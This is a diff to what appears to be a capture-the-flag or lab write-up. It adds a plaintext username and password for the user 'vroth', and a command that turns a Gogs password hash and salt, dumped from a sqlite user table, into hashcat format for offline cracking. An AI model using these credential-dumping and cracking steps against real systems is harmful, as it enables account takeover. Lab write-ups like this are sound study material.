@@ -779,7 +779,7 @@ Archive:  db.zip
                                                
 ```
 
-vroth creds
+vroth:mOo03jpsqx8JQYMBwvFP
 
 ---
 ### Exploitation
@@ -933,6 +933,12 @@ sqlite> SELECT id, name, email, passwd, salt, is_admin FROM user;
 │  │               │                      │63c111b22b23075ebd790c4015e315ddb3d770c3f7caa97d│          │        │
 │  │               │                      │6620                                            │          │        │
 ╰──┴───────────────┴──────────────────────┴────────────────────────────────────────────────┴──────────┴────────
+```
+
+```
+python3 GogsToHashcat.py -n 10000 -o nvirelli.hash QRIHYJqJdcDW3YdxPy25 8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f28aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755d3e8
+sha256:10000:UVJJSFlKcUpkY0RXM1lkeFB5MjU=:jZs6AcOgJgs52wEa7R2/I5uLGyivYUHyiqAdOzq4/9RAi8W5Bl/5V+cWN1p77BdV0+g=
+Hash file successfully written as: nvirelli.hash
 ```
 
 
